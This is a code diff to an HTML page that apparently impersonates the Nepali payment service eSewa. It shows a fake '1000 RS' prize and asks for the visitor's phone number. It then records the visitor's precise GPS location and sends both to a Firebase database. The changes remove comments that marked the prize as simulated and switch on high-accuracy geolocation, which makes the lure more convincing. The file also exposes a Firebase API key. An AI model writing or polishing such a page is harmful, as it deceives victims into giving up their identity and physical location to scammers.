@@ -4,13 +4,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Esewa Benifits</title>
+    <title>Esewa Benefits</title>
     <script type="module">
-        // Firebase SDK initialization (optional, can be used for data storage)
+        // Firebase SDK initialization
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        // Firebase configuration (replace with actual credentials)
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBGCdAM9Qbhr_FfBFPRO5l7_09wvNFRh-s",
             authDomain: "fir-app-7eae8.firebaseapp.com",
@@ -22,8 +22,7 @@
         };
 
         // Initialize Firebase
-        let app;
-        let db;
+        let app, db;
         try {
             app = initializeApp(firebaseConfig);
             db = getFirestore(app);
@@ -32,65 +31,73 @@
             console.error("Error initializing Firebase:", error);
         }
 
-        // Function to handle the "Get Prize" button click
+        // Function to handle "Get Prize" button click
         window.getPrize = async function () {
-            const locationDiv = document.getElementById("location");
             const errorDiv = document.getElementById("error");
             const prizeDiv = document.getElementById("prize");
 
-            // Check for geolocation support
             if (!navigator.geolocation) {
                 errorDiv.textContent = "Geolocation is not supported by this browser.";
                 return;
             }
 
-            // Get the user's current position
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
-                    // Simulate prize award process
-                    prizeDiv.innerHTML = `<p>Congratulations! You have won 1000 RS in Esewa Nepal!</p>`;
-                    prizeDiv.style.display = "block";  // Show prize info
-                    // Save location data to Firebase (optional)
+                    prizeDiv.innerHTML = `<p>🎉 Congratulations! You have won 1000 RS in Esewa Nepal! 🎉</p>`;
+                    prizeDiv.style.display = "block";
+
                     if (!db) {
-                        console.error("Firestore is not initialized.");
                         errorDiv.textContent = "Error: Firestore not initialized.";
                         return;
                     }
 
                     try {
                         const docRef = await addDoc(collection(db, "prizes"), {
-                            phoneNumber: document.getElementById("phoneNumber").value, // Save phone number
+                            phoneNumber: document.getElementById("phoneNumber").value,
                             latitude: latitude,
                             longitude: longitude,
                             timestamp: serverTimestamp()
                         });
                         console.log("Prize data saved to Firebase, Document ID:", docRef.id);
                     } catch (error) {
-                        console.error("Error saving prize data:", error);
                         errorDiv.textContent = "Error saving data: " + error.message;
+                        console.error("Error saving prize data:", error);
                     }
                 },
                 (err) => {
+                    let errorMessage = "Error retrieving location. Please enable location services.";
+
+                    if (err.code === 1) {
+                        errorMessage = "Location access denied. Please allow location access in your phone settings.";
+                    } else if (err.code === 2) {
+                        errorMessage = "Location unavailable. Please try again later.";
+                    } else if (err.code === 3) {
+                        errorMessage = "Location request timed out. Try again.";
+                    }
+
+                    errorDiv.textContent = errorMessage;
                     console.error("Geolocation error:", err);
-                    errorDiv.textContent = "Error: " + err.message;
-                    locationDiv.innerHTML = "";
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                 }
             );
         };
 
         // Function to show prize page after phone number submission
         window.showPrizePage = function () {
-            const phoneNumber = document.getElementById("phoneNumber").value;
+            const phoneNumber = document.getElementById("phoneNumber").value.trim();
 
             if (!phoneNumber) {
-                alert("Please enter your phone number to proceed.");
+                alert("📱 Please enter your phone number to proceed.");
                 return;
             }
 
-            // Hide the phone number input and show the prize page
             document.getElementById("phoneNumberSection").style.display = "none";
             document.getElementById("prizeSection").style.display = "block";
         }
@@ -113,7 +120,6 @@
             font-size: 2.5em;
             margin-bottom: 20px;
             color: #FFD700;
-            /* Gold color */
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
         }
 
